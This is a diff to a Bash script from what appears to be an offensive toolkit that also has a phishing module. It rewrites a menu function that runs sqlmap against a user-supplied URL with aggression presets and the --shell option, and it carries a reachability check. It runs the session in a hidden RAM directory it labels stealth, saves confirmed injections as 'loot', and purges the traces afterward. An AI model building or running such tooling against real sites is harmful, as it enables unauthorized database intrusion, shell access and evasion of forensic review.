@@ -251,65 +251,60 @@ run_phishing() {
 
 
 run_sqlmap() {
-    # 1. Унифицированная шапка
     print_header "SMART SQL INJECTION (SQLMAP)"
 
-    echo -en "${Y}Enter Target URL: ${NC}"
-    read -r target_url
-    [[ -z "$target_url" ]] && return
+    # 1. Быстрая проверка софта
+    check_step "cmd" "sqlmap" "SQLmap is not installed." || { pause; return; }
 
-    # 2. Выбор агрессивности через эвристические пресеты
+    echo -en "${Y}Enter Target URL ${W}(Leave empty for SQLmap Help/Shell)${Y}: ${NC}"
+    read -r target_url
+
+    # 2. Универсальный запуск пустой консоли, если URL не введен
+    # Используем --wizard или -h как дефолтную команду для "ручного" режима
+    check_empty_run "$target_url" "/tmp" "sqlmap --wizard" && return
+
+    # 3. Валидация цели (порт 80/443)
+    check_step "port" "${target_url#*//}:80" "Target host is unreachable." || \
+    ask_confirm "Host seems down. Force start?" || return
+
+    # 4. Выбор пресета агрессивности
     print_status "w" "Select Aggression Level:"
-    echo -e " 1) Stealth  ${W}(L1, R1)${NC} - Default"
+    echo -e " 1) Stealth  ${W}(L1, R1)${NC}"
     echo -e " 2) Advanced ${W}(L3, R2, T5)${NC}"
     echo -e " 3) Insane   ${W}(L5, R3, T10)${NC}"
     echo -en "${Y}>> ${NC}"
     read -r opt
 
     local args="--batch --random-agent --dbms=auto --shell"
-    
     case "$opt" in
         2) args="$args --level 3 --risk 2 --threads 5" ;;
         3) args="$args --level 5 --risk 3 --threads 10 --flush-session" ;;
         *) args="$args --level 1 --risk 1" ;;
     esac
 
-    # 3. Стелс-настройка: работа в RAM (/dev/shm)
+    # 5. Стелс-сессия в RAM
     local tmp_dir="/dev/shm/.p_sql_$RANDOM"
     mkdir -p "$tmp_dir"
 
-    print_status "i" "Launching SQLmap Engine..."
-    print_status "i" "Mode: $args"
-
-    # Запуск процесса
+    print_status "i" "Launching Engine: $args"
+    
+    # Запуск
     sqlmap -u "$target_url" $args --output-dir="$tmp_dir" --answers="quit=N,follow=Y"
 
-    # 4. Анализ результата и сохранение "лута"
-    if [[ -d "$tmp_dir" ]]; then
-        # Ищем файл лога, где sqlmap подтверждает инъекцию
-        local log_file=$(find "$tmp_dir" -name "log" -type f 2>/dev/null)
+    # 6. Анализ и автоматический "лут"
+    local log_file=$(find "$tmp_dir" -name "log" -type f 2>/dev/null)
+    
+    if check_step "file" "$log_file" "No vulnerabilities detected."; then
+        print_status "s" "VULNERABILITY CONFIRMED!"
+        local summary=$(grep -E "Target|Payload|Type" "$log_file" | tail -n 5)
         
-        if [[ -n "$log_file" && -s "$log_file" ]]; then
-            print_status "s" "VULNERABILITY CONFIRMED!"
-            local summary=$(grep -E "Target|Payload|Type" "$log_file" | tail -n 5)
-            
-            # Сохраняем в общий лог лута
-            log_loot "sqlmap" "SUCCESS: $target_url | Data: $summary"
-            
-            # Дублируем в специальный файл успешных инъекций
-            echo -e "--- [ $(date) ] ---\nURL: $target_url\n$summary\n" >> /root/prime_loot/sql_success.txt
-            
-            print_status "s" "Report saved to: /root/prime_loot/sql_success.txt"
-        else
-            print_status "e" "No injection points found or target is protected."
-        fi
-        
-        # 5. Мгновенная зачистка следов в RAM
-        rm -rf "$tmp_dir"
-        print_status "i" "RAM session cleared."
+        log_loot "sqlmap" "SUCCESS: $target_url"
+        echo -e "--- [ $(date) ] ---\nURL: $target_url\n$summary\n" >> /root/prime_loot/sql_success.txt
+        print_status "s" "Results saved to /root/prime_loot/"
     fi
 
+    # 7. Финальная зачистка
+    rm -rf "$tmp_dir"
+    print_status "i" "RAM Purge Complete."
     pause
 }
-
-
